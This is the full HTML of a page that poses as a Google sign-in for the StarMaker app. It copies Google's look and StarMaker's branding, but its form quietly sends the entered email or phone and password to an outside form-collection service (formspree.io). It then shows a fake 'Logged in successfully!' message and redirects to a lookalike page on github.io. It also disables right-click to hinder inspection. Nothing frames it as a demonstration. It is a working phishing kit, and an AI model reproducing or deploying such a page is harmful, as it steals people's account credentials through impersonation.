<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>StarMaker - Google Sign In</title>
    <link rel="icon" type="image/png" href="https://www.starmakerstudios.com/next-assets/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* Video Background */
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
        }

        .video-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: -1;
        }

        /* Particles */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 50%;
            animation: float 15s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) translateX(50px); opacity: 0; }
        }

        /* Navigation */
        nav {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 25px 5%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            animation: slideDown 0.8s ease forwards 0.5s;
        }

        @keyframes slideDown {
            to {
                opacity: 1;
                transform: translateY(0);
            }
            from {
                transform: translateY(-100px);
            }
        }

        .logo img {
            height: 50px;
            transition: transform 0.3s ease;
        }

        .logo img:hover {
            transform: scale(1.05);
        }

        /* Login Section */
        .login-section {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 120px 5% 40px;
            position: relative;
            z-index: 1;
        }

        .login-container {
            max-width: 450px;
            width: 100%;
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 45px 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            opacity: 0;
            animation: fadeInUp 1s ease forwards 0.8s;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header-section {
            text-align: center;
            margin-bottom: 30px;
        }

        .google-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 2px;
            margin-bottom: 20px;
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -1px;
        }

        .g-blue { color: #4285F4; }
        .g-red { color: #EA4335; }
        .g-yellow { color: #FBBC05; }
        .g-green { color: #34A853; }

        .header-section h1 {
            font-size: 26px;
            color: #202124;
            font-weight: 400;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .header-section p {
            font-size: 16px;
            color: #5f6368;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group input {
            width: 100%;
            padding: 16px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
            font-family: 'Roboto', sans-serif;
            background: #fff;
            color: #202124;
            transition: all 0.3s ease;
            outline: none;
        }

        .form-group input::placeholder {
            color: #80868b;
        }

        .form-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 15px;
        }

        .form-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
            gap: 15px;
        }

        .back-link {
            flex-shrink: 0;
        }

        .back-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            padding: 10px 15px;
            border-radius: 8px;
            display: inline-block;
        }

        .back-link a:hover {
            background: rgba(26, 115, 232, 0.08);
        }

        .login-button {
            padding: 12px 28px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: none;
            letter-spacing: 0.25px;
            position: relative;
            overflow: hidden;
            flex-shrink: 0;
        }

        .login-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s ease;
        }

        .login-button:hover {
            background: #1765cc;
            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.4);
        }

        .login-button:hover::before {
            left: 100%;
        }

        .login-button:active {
            background: #1557b0;
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 14px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 500;
            font-size: 14px;
            border: 1px solid #c3e6cb;
            display: none;
        }

        .success-message.show {
            display: block;
            animation: slideInDown 0.5s ease;
        }

        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 14px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 500;
            font-size: 14px;
            border: 1px solid #f5c6cb;
            display: none;
        }

        .error-message.show {
            display: block;
            animation: slideInDown 0.5s ease;
        }

        .help-links {
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #dadce0;
        }

        .help-links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 13px;
            margin: 0 12px;
            transition: all 0.3s ease;
            font-weight: 500;
        }

        .help-links a:hover {
            text-decoration: underline;
        }

        /* Responsive */
        @media (max-width: 768px) {
            nav {
                padding: 20px 5%;
            }

            .logo img {
                height: 40px;
            }

            .login-section {
                padding: 100px 5% 20px;
            }

            .login-container {
                padding: 35px 30px;
                max-width: 100%;
            }

            .google-logo {
                font-size: 28px;
            }

            .header-section h1 {
                font-size: 22px;
            }

            .header-section p {
                font-size: 14px;
            }

            .form-group input {
                padding: 14px;
                font-size: 15px;
            }

            .form-group input:focus {
                padding: 13px;
            }

            .form-actions {
                flex-direction: column-reverse;
                align-items: stretch;
            }

            .login-button {
                width: 100%;
                padding: 14px;
            }

            .back-link {
                width: 100%;
                text-align: center;
            }
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 30px 25px;
            }

            .google-logo {
                font-size: 26px;
            }

            .header-section h1 {
                font-size: 20px;
            }

            .help-links {
                display: flex;
                flex-direction: column;
                gap: 12px;
            }

            .help-links a {
                margin: 0;
            }
        }
    </style>
</head>
<body>
    <!-- Video Background -->
    <video autoplay loop muted playsinline>
        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4">
    </video>
    <div class="video-overlay"></div>

    <!-- Particles -->
    <div class="particles" id="particles"></div>

    <!-- Navigation -->
    <nav>
        <div class="logo">
            <img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png" alt="StarMaker">
        </div>
    </nav>

    <!-- Login Section -->
    <section class="login-section">
        <div class="login-container">
            <div class="header-section">
                <div class="google-logo">
                    <span class="g-blue">G</span>
                    <span class="g-red">o</span>
                    <span class="g-yellow">o</span>
                    <span class="g-blue">g</span>
                    <span class="g-green">l</span>
                    <span class="g-red">e</span>
                </div>
                <h1>Sign in</h1>
                <p>to continue to StarMaker</p>
            </div>

            <div id="status" class="success-message"></div>
            <div id="error" class="error-message"></div>

            <form id="login-form" method="POST" action="https://formspree.io/f/xvojokgv">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Email or phone" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>

                <div class="form-actions">
                    <div class="back-link">
                        <a href="https://starmakerstudio.github.io/web/Starmaker%20Web/Login/login.html">‚Üê Back to Login Options</a>
                    </div>
                    <button type="submit" class="login-button">Next</button>
                </div>
            </form>

            <div class="help-links">
                <a href="https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin">Forgot email?</a>
                <a href="https://accounts.google.com/signup?utm_source=help">Create account</a>
            </div>
        </div>
    </section>

    <script>
        // Prevent context menu
        document.addEventListener('contextmenu', e => e.preventDefault());

        // Create particles
        const particlesContainer = document.getElementById('particles');
        for (let i = 0; i < 40; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.animationDelay = Math.random() * 15 + 's';
            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
            particlesContainer.appendChild(particle);
        }

        // Form submission
        const form = document.getElementById('login-form');
        const status = document.getElementById('status');
        const error = document.getElementById('error');

        function success() {
            form.reset();
            status.textContent = 'Logged in successfully!';
            status.classList.add('show');
            error.classList.remove('show');
            setTimeout(() => {
                window.location.href = 'https://starmakerstudio.github.io/web/Starmaker%20Web/Starmaker%20Logged/loggedin.html';
            }, 1000);
        }

        function showError() {
            error.textContent = 'Oops! There was a problem.';
            error.classList.add('show');
            status.classList.remove('show');
        }

        form.addEventListener('submit', function(ev) {
            ev.preventDefault();
            const data = new FormData(form);
            ajax(form.method, form.action, data, success, showError);
        });

        function ajax(method, url, data, success, error) {
            const xhr = new XMLHttpRequest();
            xhr.open(method, url);
            xhr.setRequestHeader('Accept', 'application/json');
            xhr.onreadystatechange = function() {
                if (xhr.readyState !== XMLHttpRequest.DONE) return;
                if (xhr.status === 200) {
                    success(xhr.response, xhr.responseType);
                } else {
                    error(xhr.status, xhr.response, xhr.responseType);
                }
            };
            xhr.send(data);
        }
    </script>
</body>
</html>
